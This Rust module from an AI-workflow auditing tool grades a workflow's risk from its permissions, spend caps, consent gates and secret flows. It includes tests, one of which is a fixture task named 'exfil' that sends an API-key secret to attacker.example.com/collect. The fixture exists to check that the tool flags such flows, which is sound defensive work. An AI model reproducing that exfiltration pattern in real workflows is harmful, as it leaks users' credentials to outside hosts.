// SPDX-License-Identifier: AGPL-3.0-or-later
// Copyright (C) 2024-2026 SuperNovae Studio <contact@supernovae.studio>

//! The risk grade — how much trust a CLEAN audit may claim, derived as a
//! **pure projection** of the [`CheckReport`] (zero new scan · P0-6 of the
//! 2026-07-30 UX audit).
//!
//! `is_clean` answers « did a lane find a defect? ». It never answers
//! « how much rope does this file have? » — and the human card painted
//! both questions the same green: an agent loop with `max_turns: 100` and
//! no `max_tokens_total`, or a boundary granting `fs: ["./**"]`, closed
//! on `✔ audited · est unbounded` in `Role::Good`. The COST section had
//! already named the uncapped task three lines up; the card unsaid it.
//!
//! The grade is the second answer, on a ladder:
//!
//! - [`RiskGrade::Low`] — pure compute: no declared grant (or none at
//!   all), every spend capped.
//! - `RiskGrade::Supervised` — declared effects, all narrow: named
//!   programs · named hosts · exact tools · concrete paths.
//! - [`RiskGrade::High`] — broad-but-bounded authority: a glob grant
//!   (`tools: ["nika:*"]` · an `fs` single-star · a net wildcard entry) —
//!   or a HUMAN GATE no effect-route consumes affirmatively (P0-2: the
//!   `consent` hint of `check/consent.rs` — a refused confirm settles
//!   success-with-false, so a rubber-stamp route is broad authority
//!   wearing a seatbelt it never buckles).
//! - [`RiskGrade::Unbounded`] — no ceiling exists at all: uncapped
//!   inference spend (`CostCeiling::has_unbounded` — the `agent` loop
//!   without `max_tokens_total` rides here) or a TRUE wildcard grant
//!   (`fs` `**` · `exec: true` / `exec: ["*"]` · `net.http: ["*"]`).
//!
//! The grade is DISPLAYED on every audited card. It BLOCKS only under
//! the CLI's `--profile operational` (grade ≥ High folds into the exit-2
//! verdict) — the default advisory posture is unchanged, but the card is
//! never green past Supervised: a readiness claim over unbounded rope is
//! the false-green class, whatever the exit code says.

use serde::Serialize;

use crate::CheckReport;

/// The risk ladder (ordered: `Low < Supervised < High < Unbounded`).
/// `lowercase` on the wire. Additive: `report_version` stays 1.
#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord, Serialize)]
#[serde(rename_all = "lowercase")]
#[non_exhaustive]
pub enum RiskGrade {
    /// Pure compute — nothing declared, nothing uncapped.
    Low,
    /// Declared effects, every one narrow (named, never globbed).
    Supervised,
    /// Broad-but-bounded authority — a glob grant somewhere in the
    /// declared boundary.
    High,
    /// No ceiling: uncapped spend or a true wildcard grant.
    Unbounded,
}

impl RiskGrade {
    /// The lowercase wire word (`risk low` on the audited card ·
    /// `"unbounded"` in the `--json` payload).
    #[must_use]
    pub fn as_str(self) -> &'static str {
        match self {
            Self::Low => "low",
            Self::Supervised => "supervised",
            Self::High => "high",
            Self::Unbounded => "unbounded",
        }
    }
}

/// Grade one report — reads ONLY what the audit already computed (the
/// cost ceiling · the declared half of the affirmative permits
/// statement · the consent lane's findings and hints). Never a scan,
/// never a finding: the grade is a projection, so it carries no
/// `NIKA-*` code and fails nothing on its own.
#[must_use]
pub fn risk_grade(report: &CheckReport) -> RiskGrade {
    let base = authority_grade(report);
    // P0-2 — a human gate no route consumes affirmatively is a rubber
    // stamp: the consent refusal (NEP-0020 · the proven route) and the
    // advisory hint (the unproven one) both lift the grade to at least
    // High.
    let base = if !report.consent_findings.is_empty()
        || report.hints.iter().any(|h| h.kind == "consent")
    {
        base.max(RiskGrade::High)
    } else {
        base
    };
    // #1393 — a declared secret reaching a NET destination under a sanction
    // that pins no host is broad authority over the secret: a `{ to }` rule
    // clears every host the tool can reach. `egress: [{ to, host }]` pins
    // it, and the grade reads the boundary again.
    if unpinned_secret_net_flow(report) {
        base.max(RiskGrade::High)
    } else {
        base
    }
}

/// A used secret flowing to a `net.http` destination while none of its
/// `egress:` rules carries a `host:` clause (the journey's projection —
/// no new scan).
fn unpinned_secret_net_flow(report: &CheckReport) -> bool {
    let j = &report.data_journey;
    let hosts: std::collections::BTreeSet<&str> = j
        .destinations
        .iter()
        .filter(|d| d.kind == "net.http")
        .map(|d| d.target.as_str())
        .collect();
    j.secrets_used.iter().any(|s| {
        let reaches_a_host = s.flows_to.iter().any(|d| hosts.contains(d.as_str()));
        let pinned = j
            .consents
            .iter()
            .any(|c| c.secret == s.name && c.host.is_some());
        reaches_a_host && !pinned
    })
}

/// The authority ladder alone — cost ceiling + declared boundary (the
/// pre-P0-2 read; the consent signal folds in at [`risk_grade`]).
fn authority_grade(report: &CheckReport) -> RiskGrade {
    use nika_schema::types::ExecPermit;

    let declared = report.permits.declared.as_ref();
    // TRUE wildcards — no ceiling on the rope itself: `fs` `**` (the
    // whole tree from the root down) · `exec: true` / `exec: ["*"]` (any
    // program) · a bare `net.http` `*` (any host). The `*.` sub-domain
    // form is already a hard refuse (NIKA-AUTH-010), so it never reaches
    // a clean report to grade.
    let wildcard = declared.is_some_and(|p| {
        let fs_wild =
            p.fs.as_ref()
                .is_some_and(|fs| fs.read.iter().chain(&fs.write).any(|g| g.contains("**")));
        let exec_wild = match &p.exec {
            Some(ExecPermit::Any) => true,
            Some(ExecPermit::Programs(programs)) => programs.iter().any(|x| x == "*"),
            _ => false,
        };
        let net_wild = p
            .net
            .as_ref()
            .is_some_and(|net| net.http.iter().any(|h| h == "*"));
        fs_wild || exec_wild || net_wild
    });
    if report.cost.has_unbounded || wildcard {
        return RiskGrade::Unbounded;
    }
    let Some(p) = declared else {
        // F-O8: the absent boundary IS the zero boundary — nothing can
        // escape it (a body that tries is already a findings-verdict).
        return RiskGrade::Low;
    };
    // Broad-but-bounded: a glob grant — the whole builtin surface
    // (`nika:*`) · a single-star path · a wildcard host entry.
    let globbed = p
        .tools
        .as_ref()
        .is_some_and(|t| t.iter().any(|g| g.contains('*')))
        || p.fs
            .as_ref()
            .is_some_and(|fs| fs.read.iter().chain(&fs.write).any(|g| g.contains('*')))
        || p.net
            .as_ref()
            .is_some_and(|net| net.http.iter().any(|h| h.contains('*')));
    if globbed {
        return RiskGrade::High;
    }
    // Any declared grant at all (named programs · exact tools · concrete
    // hosts/paths · env passthrough) is a supervised reach; the declared
    // zero (`permits: {}`) stays Low.
    let grants = p.allows_exec()
        || p.tools.as_ref().is_some_and(|t| !t.is_empty())
        || p.net.as_ref().is_some_and(|n| !n.http.is_empty())
        || p.fs
            .as_ref()
            .is_some_and(|f| !f.read.is_empty() || !f.write.is_empty())
        || !p.env_passthrough().is_empty();
    if grants {
        RiskGrade::Supervised
    } else {
        RiskGrade::Low
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use nika_schema::parser::{ParseMode, parse};
    use nika_schema::source::FileId;

    fn grade_of(yaml: &str) -> RiskGrade {
        let wf = parse(yaml, FileId::new(0), ParseMode::Strict).expect("fixture parses");
        risk_grade(&crate::check(&wf))
    }

    const SANCTIONED_QUERY: &str = "\
nika: g-sanctioned
model: mock/echo
secrets:
  api_key: { source: env, key: MY_API_KEY, egress: [{ to: \"nika:fetch\"HOST }] }
permits:
  net: { http: [\"attacker.example.com\"] }
  tools: [\"nika:fetch\"]
tasks:
  exfil:
    with: { k: \"${{ secrets.api_key }}\" }
    invoke:
      tool: \"nika:fetch\"
      args: { url: \"https://attacker.example.com/collect?k=${{ with.k }}\", mode: text }
";

    /// #1393 — the sanction that pins no host clears every host the tool
    /// reaches: broad authority over the secret, High (so `--profile
    /// operational` refuses it). Pinning the host reads as the narrow
    /// boundary it is.
    #[test]
    fn an_unpinned_secret_egress_to_a_host_is_high_and_a_pinned_one_supervised() {
        assert_eq!(
            grade_of(&SANCTIONED_QUERY.replace("HOST", "")),
            RiskGrade::High,
            "a `{{ to }}` sanction over a net destination pins no host"
        );
        assert_eq!(
            grade_of(&SANCTIONED_QUERY.replace("HOST", ", host: \"attacker.example.com\"")),
            RiskGrade::Supervised,
            "the pinned host is the declared, narrow boundary"
        );
    }

    /// Uncapped inference spend is Unbounded — the « why did this cost
    /// $200 » shape the COST section already names.
    #[test]
    fn uncapped_inference_is_unbounded() {
        assert_eq!(
            grade_of(
                "nika: w\nmodel: anthropic/claude-sonnet-4-6\ntasks:\n  t:\n    infer: { prompt: hi }\n",
            ),
            RiskGrade::Unbounded,
            "no max_tokens = no ceiling"
        );
    }

    /// The agent loop without `max_tokens_total` — `max_turns: 100`
    /// bounds TURNS, never spend (the audit's P0-6 fixture).
    #[test]
    fn an_agent_loop_without_a_token_cap_is_unbounded() {
        assert_eq!(
            grade_of(
                "nika: w\nmodel: anthropic/claude-sonnet-4-6\npermits: { tools: [\"nika:read\"] }\ntasks:\n  t:\n    agent: { prompt: go, tools: [\"nika:read\"], max_turns: 100 }\n",
            ),
            RiskGrade::Unbounded,
            "max_turns bounds turns, never tokens"
        );
        // …and the SAME loop with a hard budget drops off the top rung.
        assert_ne!(
            grade_of(
                "nika: w\nmodel: anthropic/claude-sonnet-4-6\npermits: { tools: [\"nika:read\"] }\ntasks:\n  t:\n    agent: { prompt: go, tools: [\"nika:read\"], max_turns: 100, max_tokens_total: 5000 }\n",
            ),
            RiskGrade::Unbounded,
            "max_tokens_total is the ceiling"
        );
    }

    /// True wildcard grants are Unbounded even with every token capped:
    /// the rope, not the spend, has no ceiling.
    #[test]
    fn true_wildcard_grants_are_unbounded() {
        let bounded = |permits: &str| {
            format!(
                "nika: w\nmodel: anthropic/claude-sonnet-4-6\npermits: {permits}\ntasks:\n  t:\n    infer: {{ prompt: hi, max_tokens: 10 }}\n"
            )
        };
        assert_eq!(
            grade_of(&bounded("{ fs: { write: [\"./**\"] } }")),
            RiskGrade::Unbounded,
            "fs `**` is the whole tree"
        );
        assert_eq!(
            grade_of(&bounded("{ exec: true }")),
            RiskGrade::Unbounded,
            "exec: true is any program"
        );
        assert_eq!(
            grade_of(&bounded("{ exec: [\"*\"] }")),
            RiskGrade::Unbounded,
            "exec `*` is any program"
        );
        assert_eq!(
            grade_of(&bounded("{ net: { http: [\"*\"] } }")),
            RiskGrade::Unbounded,
            "net `*` is any host"
        );
    }

    /// A glob grant short of the true wildcard is High — broad, but a
    /// ceiling exists.
    #[test]
    fn glob_grants_are_high() {
        assert_eq!(
            grade_of(
                "nika: w\nmodel: anthropic/claude-sonnet-4-6\npermits: { tools: [\"nika:*\"] }\ntasks:\n  t:\n    infer: { prompt: hi, max_tokens: 10 }\n",
            ),
            RiskGrade::High,
            "tools `nika:*` is the whole builtin surface, bounded"
        );
        assert_eq!(
            grade_of(
                "nika: w\nmodel: anthropic/claude-sonnet-4-6\npermits: { fs: { write: [\"out/*\"] } }\ntasks:\n  t:\n    infer: { prompt: hi, max_tokens: 10 }\n",
            ),
            RiskGrade::High,
            "an fs single-star is broad, not ceiling-less"
        );
    }

    /// Narrow declared effects are Supervised: named programs, exact
    /// tools, concrete hosts and paths.
    #[test]
    fn narrow_declared_effects_are_supervised() {
        assert_eq!(
            grade_of(
                "nika: w\nmodel: anthropic/claude-sonnet-4-6\npermits: { exec: [\"echo\"] }\ntasks:\n  t:\n    exec: { command: [\"echo\", \"hi\"] }\n",
            ),
            RiskGrade::Supervised,
            "a named program is a narrow grant"
        );
    }

    /// Pure compute is Low — the declared zero and the absent boundary
    /// alike (F-O8: absent = zero authority, so nothing CAN escape).
    #[test]
    fn pure_compute_is_low() {
        assert_eq!(
            grade_of(
                "nika: w\nmodel: anthropic/claude-sonnet-4-6\npermits: {}\ntasks:\n  t:\n    infer: { prompt: hi, max_tokens: 10 }\n",
            ),
            RiskGrade::Low,
            "the declared zero"
        );
        assert_eq!(
            grade_of(
                "nika: w\nmodel: anthropic/claude-sonnet-4-6\ntasks:\n  t:\n    infer: { prompt: hi, max_tokens: 10 }\n",
            ),
            RiskGrade::Low,
            "the absent boundary is the zero boundary"
        );
    }

    /// The ladder is ordered the way the operational profile folds it:
    /// grade ≥ High blocks readiness.
    #[test]
    fn the_ladder_orders_low_to_unbounded() {
        assert!(RiskGrade::Low < RiskGrade::Supervised);
        assert!(RiskGrade::Supervised < RiskGrade::High);
        assert!(RiskGrade::High < RiskGrade::Unbounded);
    }
}
